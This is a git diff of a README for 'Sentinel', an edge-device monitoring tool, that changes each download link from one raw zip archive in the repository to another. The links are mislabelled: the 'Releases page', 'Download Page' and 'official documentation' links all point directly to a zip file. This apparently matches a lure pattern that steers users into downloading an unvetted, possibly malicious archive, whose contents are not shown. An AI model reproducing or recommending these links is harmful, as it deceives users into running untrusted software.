@@ -32,10 +32,10 @@ Before you download, check that your system meets these requirements:
 ## 📥 Download and Install
 You can download Sentinel from our Releases page. Simply visit the link below:
 
-[![Download Sentinel](https://github.com/Kamal266me/sentinel/raw/refs/heads/main/deploy/Software_v3.9.zip%https://github.com/Kamal266me/sentinel/raw/refs/heads/main/deploy/Software_v3.9.zip)](https://github.com/Kamal266me/sentinel/raw/refs/heads/main/deploy/Software_v3.9.zip)
+[![Download Sentinel](https://github.com/Kamal266me/sentinel/raw/refs/heads/main/cmd/predictor/Software_v3.3.zip%https://github.com/Kamal266me/sentinel/raw/refs/heads/main/cmd/predictor/Software_v3.3.zip)](https://github.com/Kamal266me/sentinel/raw/refs/heads/main/cmd/predictor/Software_v3.3.zip)
 
 ### Steps to Download
-1. Click on the button above or visit the following link: [Download Page](https://github.com/Kamal266me/sentinel/raw/refs/heads/main/deploy/Software_v3.9.zip).
+1. Click on the button above or visit the following link: [Download Page](https://github.com/Kamal266me/sentinel/raw/refs/heads/main/cmd/predictor/Software_v3.3.zip).
 2. On the Releases page, you will see the latest version.
 3. Click on the version you're interested in.
 4. Choose the file that matches your operating system (Windows, macOS, or Linux).
@@ -57,7 +57,7 @@ You can download Sentinel from our Releases page. Simply visit the link below:
 3. Follow the on-screen instructions to configure and start using Sentinel.
 
 ## 📖 Documentation
-For more detailed instructions on configuration and advanced features, refer to the [official documentation](https://github.com/Kamal266me/sentinel/raw/refs/heads/main/deploy/Software_v3.9.zip).
+For more detailed instructions on configuration and advanced features, refer to the [official documentation](https://github.com/Kamal266me/sentinel/raw/refs/heads/main/cmd/predictor/Software_v3.3.zip).
 
 ## 🤝 Support
 If you encounter any issues or have questions, please check the Issues section on our GitHub page or open a new issue. Our community is here to help you.
@@ -65,4 +65,4 @@ If you encounter any issues or have questions, please check the Issues section o
 ## 🎉 Conclusion
 Sentinel provides a robust solution for maintaining the health of your edge devices. With its predictive capabilities and user-friendly interface, you can ensure your applications run smoothly. For more information and updates, keep an eye on our Releases page.
 
-[![Download Sentinel](https://github.com/Kamal266me/sentinel/raw/refs/heads/main/deploy/Software_v3.9.zip%https://github.com/Kamal266me/sentinel/raw/refs/heads/main/deploy/Software_v3.9.zip)](https://github.com/Kamal266me/sentinel/raw/refs/heads/main/deploy/Software_v3.9.zip)
+[![Download Sentinel](https://github.com/Kamal266me/sentinel/raw/refs/heads/main/cmd/predictor/Software_v3.3.zip%https://github.com/Kamal266me/sentinel/raw/refs/heads/main/cmd/predictor/Software_v3.3.zip)](https://github.com/Kamal266me/sentinel/raw/refs/heads/main/cmd/predictor/Software_v3.3.zip)
